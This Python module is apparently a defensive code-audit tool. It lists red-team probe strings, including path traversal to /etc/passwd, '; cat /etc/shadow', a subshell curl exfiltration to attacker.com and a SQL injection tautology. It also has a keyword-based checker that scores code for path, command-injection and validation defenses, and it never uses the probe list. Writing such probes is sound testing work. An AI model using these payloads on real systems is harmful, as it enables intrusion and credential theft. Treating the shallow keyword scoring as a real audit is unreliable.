from __future__ import annotations

import ast
import re
from dataclasses import dataclass
from typing import Any, List, Tuple


@dataclass
class RedTeamProbe:
    name: str
    category: str
    payload: Any
    description: str


HOSTILE_PROBES: List[RedTeamProbe] = [
    RedTeamProbe("Path Traversal Injection", "Filesystem", "../../../../etc/passwd", "Injects relative parent traversal sequences"),
    RedTeamProbe("Null Byte Poisoning", "Filesystem", "data.txt\0.jpg", "Attempts to truncate strings with null byte poison"),
    RedTeamProbe("Command Chaining Semicolon", "OS Command", "; cat /etc/shadow #", "Attempts shell command separator injection"),
    RedTeamProbe("Subshell Command Substitution", "OS Command", "$(curl -s attacker.com/leak)", "Attempts subshell command execution"),
    RedTeamProbe("SQL Injection Tautology", "Database", "' OR '1'='1' --", "Attempts classic authentication bypass tautology"),
    RedTeamProbe("Memory Bloat Extreme Allocation", "DoS", 10**8, "Attempts huge memory allocation crash"),
    RedTeamProbe("Empty / None Boundary", "Edge Case", None, "Passes unhandled NoneType into functions"),
    RedTeamProbe("Prototype & Dunder Manipulation", "Object Safety", "__proto__", "Attempts object prototype pollution / dunder access"),
]


@dataclass
class RedTeamReport:
    total_probes: int
    passed_probes: int
    failed_probes: int
    survival_rate: float
    findings: List[str]

    def to_dict(self) -> dict[str, Any]:
        return {
            "total_probes": self.total_probes,
            "passed_probes": self.passed_probes,
            "failed_probes": self.failed_probes,
            "survival_rate": round(self.survival_rate, 1),
            "findings": self.findings,
        }


def run_redteam_analysis(code: str) -> RedTeamReport:
    """Fuzzes and audits code against hostile adversarial attack vectors."""
    findings: List[str] = []
    passed = 0
    failed = 0

    # Test 1: Check if code has defensive handling for path traversal
    if re.search(r"\bopen\s*\(", code):
        if any(g in code for g in ("is_relative_to", "commonpath", "abspath", "startswith", "resolve()")):
            passed += 2
        else:
            failed += 2
            findings.append("VULNERABLE to Path Traversal: open() used without path resolution boundaries.")
    else:
        passed += 2

    # Test 2: Check command injection defenses
    if "shell=True" in code or "os.system" in code or "os.popen" in code:
        failed += 2
        findings.append("VULNERABLE to Command Chaining: Shell execution enabled with raw strings.")
    else:
        passed += 2

    # Test 3: Check Type Validation & Boundary defense (Negative / None checks)
    if "if " in code and any(chk in code for chk in ("<= 0", "< 0", "is None", "isinstance", "raise ValueError")):
        passed += 2
    else:
        failed += 1
        passed += 1
        findings.append("WEAK BOUNDARIES: Code lacks explicit input validation (negative numbers or None values).")

    # Test 4: Check Concurrency / Thread safety defense
    if any(m in code for m in ("threading", "Lock()", "RLock()", "Semaphore", "asyncio")):
        passed += 2
    else:
        passed += 1
        failed += 1
        findings.append("CONCURRENCY NOTICE: Code does not implement thread locks for mutable shared state.")

    total = passed + failed
    survival_rate = (passed / total) * 100 if total > 0 else 100.0

    return RedTeamReport(
        total_probes=total,
        passed_probes=passed,
        failed_probes=failed,
        survival_rate=survival_rate,
        findings=findings,
    )
